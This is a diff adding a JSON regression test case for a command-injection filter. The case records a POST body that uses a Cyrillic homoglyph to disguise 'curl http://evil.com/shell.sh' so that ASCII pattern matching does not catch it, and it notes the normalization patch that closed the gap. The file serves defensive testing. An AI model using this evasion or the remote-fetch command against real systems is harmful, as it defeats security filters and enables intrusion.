@@ -1,0 +1,21 @@
+{
+  "id": "attack_019",
+  "name": "Cyrillic Homoglyph Command Injection",
+  "author": "contail",
+  "date": "2026-03-06",
+  "category": "encoding_bypass",
+  "target": "stage1",
+  "attack": {
+    "method": "POST",
+    "path": "/api/query",
+    "headers": {"Content-Type": "application/json"},
+    "body": "{\"query\": \"\\u0441url http://evil.com/shell.sh\"}"
+  },
+  "why_dangerous": "Uses Cyrillic с (U+0441) instead of Latin c in 'curl'. Visually identical but bypasses ASCII pattern matching.",
+  "expected_action": "block",
+  "patched": {
+    "version": "1.1.3",
+    "date": "2026-03-06",
+    "fix": "Added Cyrillic-to-Latin homoglyph mapping in normalizeUnicode()"
+  }
+}
